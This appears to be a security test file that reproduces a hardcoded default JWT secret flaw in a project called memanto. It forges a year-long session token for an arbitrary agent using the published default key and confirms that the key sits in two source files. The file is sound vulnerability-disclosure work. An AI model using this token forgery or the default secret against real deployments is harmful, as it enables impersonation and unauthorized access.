"""
Security Test: Default JWT Secret Key

Reproducer for the hardcoded default JWT signing key vulnerability.
When MEMANTO_SECRET_KEY is not explicitly configured, the server falls
back to a well-known default, allowing anyone to forge session tokens.

Usage:
    pytest tests/test_default_jwt_secret.py -v

    Or run directly:
    python tests/test_default_jwt_secret.py
"""

import jwt
from datetime import datetime, timedelta

DEFAULT_SECRET = "memanto-default-secret-change-in-production"


def test_default_secret_can_forge_token():
    """
    Verify that the default secret can be used to forge JWT tokens for any agent.

    This demonstrates CWE-798 (Use of Hard-coded Credentials) and
    CWE-347 (Improper Verification of Cryptographic Signature).
    """
    forged_agent_id = "forged-agent-001"

    payload = {
        "agent_id": forged_agent_id,
        "namespace": f"memanto_agent_{forged_agent_id}",
        "session_id": "sess_forged_001",
        "started_at": "2026-06-30T00:00:00",
        "expires_at": (datetime.utcnow() + timedelta(days=365)).isoformat(),
    }

    # Sign the forged payload with the publicly-known default secret
    forged_token = jwt.encode(payload, DEFAULT_SECRET, algorithm="HS256")

    # The server would decode this token successfully
    decoded = jwt.decode(forged_token, DEFAULT_SECRET, algorithms=["HS256"])

    assert decoded["agent_id"] == forged_agent_id, (
        f"Expected agent_id={forged_agent_id}, got {decoded['agent_id']}"
    )
    assert decoded["namespace"] == f"memanto_agent_{forged_agent_id}", (
        f"Expected namespace=memanto_agent_{forged_agent_id}, got {decoded['namespace']}"
    )

    print("✅ PASS: Token forged successfully with default secret key")
    print(f"   Agent: {decoded['agent_id']}")
    print(f"   Namespace: {decoded['namespace']}")
    print(f"   Expires: {decoded['expires_at']}")
    print(f"   Token: {forged_token[:60]}...")


def test_default_secret_value_is_well_known():
    """
    Verify that the default secret value is in the public source code
    and thus accessible to any potential attacker.
    """
    # Read from config.py
    with open("memanto/app/config.py") as f:
        config_source = f.read()

    # Read from session_service.py
    with open("memanto/app/services/session_service.py") as f:
        service_source = f.read()

    # The default secret appears in both files
    assert DEFAULT_SECRET in config_source, (
        "Default secret should be in config.py"
    )
    assert DEFAULT_SECRET in service_source, (
        "Default secret should be in session_service.py (fallback)"
    )

    print("✅ PASS: Default secret is present in public source code")
    print(f"   Found in config.py: {DEFAULT_SECRET in config_source}")
    print(f"   Found in session_service.py: {DEFAULT_SECRET in service_source}")


if __name__ == "__main__":
    test_default_secret_can_forge_token()
    test_default_secret_value_is_well_known()
    print("\n✅ All tests passed!")
